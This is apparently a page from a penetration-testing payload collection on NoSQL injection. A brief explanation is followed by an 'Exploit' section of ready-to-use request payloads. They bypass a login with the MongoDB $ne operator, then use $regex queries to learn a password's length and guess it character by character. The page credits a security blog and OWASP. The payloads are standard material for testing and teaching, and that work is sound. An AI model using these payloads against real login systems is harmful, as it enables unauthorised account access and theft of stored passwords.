# NoSQL injection
NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## Exploit

Basic authentication bypass using not equal ($ne)
```
username[$ne]=toto&password[$ne]=toto
```

Extract length information
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

Extract data information
```
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*
```

## Thanks to
* https://www.dailysecurity.fr/nosql-injections-classique-blind/
* https://www.owasp.org/index.php/Testing_for_NoSQL_injection